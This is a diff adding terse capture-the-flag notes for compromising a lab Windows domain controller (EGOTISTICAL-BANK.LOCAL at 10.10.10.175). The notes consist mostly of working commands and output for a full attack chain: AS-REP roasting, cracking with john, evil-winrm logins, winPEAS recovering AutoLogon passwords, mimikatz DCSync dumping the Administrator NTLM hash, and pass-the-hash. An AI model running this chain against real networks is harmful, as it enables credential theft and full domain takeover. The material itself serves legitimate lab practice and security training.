@@ -1,5 +1,50 @@
 get list of admins on the web page (see users.txt)
 
+ldapsearch (look ippsec forest video)
+
 python3 GetNPUsers.pt EGOTISTICAL-BANK.LOCAL/ -usersfile users.txt -outputfile hash.txt -dc-ip 10.10.10.175
 
+john -wordlist=/usr/share/wordlists/rockyou.txt hash
+
 fmsith:Thestrokes23
+
+evil-winrm -u fsmith -p Thestrokes23 -i 10.10.10.175
+
+*Evil-WinRM* PS C:\Users\FSmith\Documents> net user
+
+user :)
+
+User accounts for \\
+
+-------------------------------------------------------------------------------
+Administrator            FSmith                   Guest
+HSmith                   krbtgt                   svc_loanmgr
+The command completed with one or more errors.
+
+*Evil-WinRM* PS C:\Users\FSmith\Documents> upload winPEAS.exe
+
+./winPEAS.exe
+
+[+] Looking for AutoLogon credentials(T1012)
+    Some AutoLogon credentials were found!!
+    DefaultDomainName             :  35mEGOTISTICALBANK
+    DefaultUserName               :  35mEGOTISTICALBANK\svc_loanmanager
+    DefaultPassword               :  Moneymakestheworldgoround!
+
+
+evil-winrm -u svc_loanmgr -p 'Moneymakestheworldgoround!' -i 10.10.10.175
+
+
+upload mimikatz.exe
+
+*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> ./mimikatz.exe "lsadump::dcsync /user:Administrator" "exit"
+
+Hash NTLM: d9485863c1e9e05851aa40cbb4ab9dff -> password
+
+sudo evil-winrm -u Administrator -H d9485863c1e9e05851aa40cbb4ab9dff -i 10.10.10.175
+
+root! :)
+
+
+
+
